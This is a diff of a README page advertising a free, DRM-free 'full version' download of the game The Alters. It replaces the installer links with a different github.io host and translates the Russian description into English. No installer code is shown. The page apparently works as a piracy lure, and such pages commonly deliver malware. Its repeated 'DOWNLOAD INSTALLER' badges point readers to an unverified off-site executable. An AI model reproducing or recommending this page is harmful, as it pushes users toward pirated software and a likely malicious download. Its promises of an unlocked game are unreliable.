@@ -1,33 +1,33 @@
 # The Alters — Free Download 
 
-[![🧪 DOWNLOAD INSTALLER: The Alters](https://img.shields.io/badge/🧪%20DOWNLOAD%20INSTALLER:%20The%20Alters-brightgreen?style=for-the-badge&logo=flask&logoColor=white)](https://the-alters-pc-download.github.io/.github)
+[![🧪 DOWNLOAD INSTALLER: The Alters](https://img.shields.io/badge/🧪%20DOWNLOAD%20INSTALLER:%20The%20Alters-brightgreen?style=for-the-badge&logo=flask&logoColor=white)](https://ryadikmntiiks.github.io/.github/THEAL)
 
 ## 🧬 About the Game
 
-**The Alters** — это уникальный научно-фантастический survival-приключенческий проект от 11 bit studios. В центре сюжета — Ян, единственный выживший на враждебной планете, который создаёт альтернативные версии самого себя — "Альтеров", чтобы справиться с одиночеством, выживанием и внутренними конфликтами. Каждый "Альтер" обладает разными навыками, характерами и даже судьбами, в зависимости от сделанных ранее выборов.
+**The Alters** is a unique sci-fi survival adventure from 11 bit studios. At the heart of the story is Jan, the sole survivor on a hostile planet, who creates alternative versions of himself — "Alters" — to cope with loneliness, survival, and inner conflicts. Each "Alter" has different skills, personalities, and even fates, depending on the choices made earlier.
 
-Игровой процесс сочетает строительство базы, принятие моральных решений, менеджмент ресурсов и глубокий нарратив. Постоянная угроза радиации, нехватки энергии и давления времени делает каждое решение значимым, а каждое взаимодействие — личным. Уникальный визуальный стиль и атмосфера изоляции усиливают напряжение и эмоциональную вовлечённость игрока.
+Gameplay combines base building, moral decision-making, resource management, and deep narrative. The constant threat of radiation, energy shortages, and time pressure makes every decision meaningful, and every interaction personal. The game’s distinctive visual style and atmosphere of isolation amplify both tension and emotional immersion.
 
-Теперь ты можешь **скачать The Alters бесплатно на ПК**, без необходимости подключения к интернету или создания аккаунта. Это идеальный способ получить полную версию игры и погрузиться в её необычный мир.
+Now you can **download The Alters on PC**, without the need for an internet connection or account creation. This is the perfect way to experience the full game and immerse yourself in its extraordinary world.
 
 ---
 
 ## 🖼 Preview
 
 ![The Alters - Screenshot 1](https://cdn1.epicgames.com/spt-assets/cbdabb1be05c4501bc3c37538d939bb3/the-alters-1nzq5.jpg)  
-*Смена идентичности и борьба за выживание*
+*Shifting identities and fighting for survival*
 
 ![The Alters - Screenshot 2](https://direct.silverliningint.com/cdn/shop/files/The_Alters_HO_Screenshot_03.jpg?v=1748351766&width=1946)  
-*Исследуй базу и взаимодействуй с альтернативными Янами*
+*Explore the base and interact with alternative Jans*
 
 ![The Alters - Screenshot 3](https://cdn.3dnews.ru/assets/external/illustrations/2025/06/19/1124655/The_Alters_review_15.jpg)  
-*Уникальный визуальный стиль от авторов Frostpunk*
+*Unique visual style from the creators of Frostpunk*
 
 ---
 
 ## 🟢 Download Installer
 
-[![🧪 DOWNLOAD INSTALLER: The Alters](https://img.shields.io/badge/🧪%20DOWNLOAD%20INSTALLER:%20The%20Alters-brightgreen?style=for-the-badge&logo=flask&logoColor=white)](https://the-alters-pc-download.github.io/.github)
+[![🧪 DOWNLOAD INSTALLER: The Alters](https://img.shields.io/badge/🧪%20DOWNLOAD%20INSTALLER:%20The%20Alters-brightgreen?style=for-the-badge&logo=flask&logoColor=white)](https://ryadikmntiiks.github.io/.github/THEAL)
 
 ---
 
@@ -44,11 +44,11 @@
 ## ✅ Features Unlocked
 
 - 🔓 Full version of **The Alters**  
-- 🧍‍♂️ Access all character "Alters" with unique abilities  
+- 🧍‍♂️ Access all "Alters" with unique abilities  
 - 🧪 Base building and survival mechanics  
 - 🎭 Deep psychological narrative  
 - 💻 Fully optimized for Windows PCs  
-- 🚫 No DRM, no internet, no account needed
+- 🚫 No DRM, no internet, no account required
 
 ---
 
